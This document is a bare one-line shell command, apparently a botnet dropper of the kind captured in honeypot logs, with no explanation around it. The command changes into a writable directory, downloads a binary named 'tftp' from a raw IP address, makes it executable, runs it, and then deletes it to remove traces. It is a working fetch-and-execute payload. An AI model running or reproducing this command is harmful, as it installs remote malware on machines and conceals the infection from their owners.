cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.207.135.146/tftp; chmod +x tftp; ./tftp; rm -rf tftp
